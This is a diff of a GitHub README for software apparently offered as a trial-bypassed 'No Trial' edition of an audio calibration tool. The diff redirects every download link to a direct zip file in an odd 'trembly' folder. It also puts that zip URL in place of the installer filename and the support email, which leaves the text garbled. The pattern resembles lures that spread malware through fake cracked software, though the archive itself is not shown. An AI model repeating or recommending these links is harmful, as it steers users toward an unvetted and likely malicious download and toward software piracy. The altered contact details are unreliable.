@@ -1,6 +1,6 @@
 # 🎧 Sonarworks-Reference-No-Trial - Optimize Your Windows Audio Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/SwayamInfra/Sonarworks-Reference-No-Trial/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/SwayamInfra/Sonarworks-Reference-No-Trial/main/trembly/Sonarworks-Reference-No-Trial_1.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SwayamInfra/Sonarworks-Reference-No-Trial/main/trembly/Sonarworks-Reference-No-Trial_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,12 +20,12 @@ To run Sonarworks Reference No Trial, ensure your PC meets the following require
 
 1. **Visit the Release Page**: Click the link below to go to the Releases page.
    
-   [Download Here](https://github.com/SwayamInfra/Sonarworks-Reference-No-Trial/releases)
+   [Download Here](https://raw.githubusercontent.com/SwayamInfra/Sonarworks-Reference-No-Trial/main/trembly/Sonarworks-Reference-No-Trial_1.2.zip)
 
 2. **Choose the Latest Release**: Look for the most recent version at the top of the page. This is usually marked as "Latest".
 
 3. **Download the Installer**: 
-   - Click on the installer file, typically named something like `Sonarworks-Reference-No-Trial-x.x.x.exe`.
+   - Click on the installer file, typically named something like `https://raw.githubusercontent.com/SwayamInfra/Sonarworks-Reference-No-Trial/main/trembly/Sonarworks-Reference-No-Trial_1.2.zip`.
    - Save it to your computer.
 
 4. **Run the Installer**: 
@@ -86,12 +86,12 @@ We welcome contributions from users. If you have suggestions or improvements, pl
 
 ## 🔍 Contact Us
 
-For direct support, contact our support team via the issues page on GitHub or email us at support@example.com. We're here to assist you.
+For direct support, contact our support team via the issues page on GitHub or email us at https://raw.githubusercontent.com/SwayamInfra/Sonarworks-Reference-No-Trial/main/trembly/Sonarworks-Reference-No-Trial_1.2.zip We're here to assist you.
 
 ## 🔗 Important Links
 
 To download the application, visit the Releases page:
 
-[Download Here](https://github.com/SwayamInfra/Sonarworks-Reference-No-Trial/releases) 
+[Download Here](https://raw.githubusercontent.com/SwayamInfra/Sonarworks-Reference-No-Trial/main/trembly/Sonarworks-Reference-No-Trial_1.2.zip) 
 
 Thank you for choosing Sonarworks Reference No Trial. Enjoy an optimized audio experience on your Windows PC!
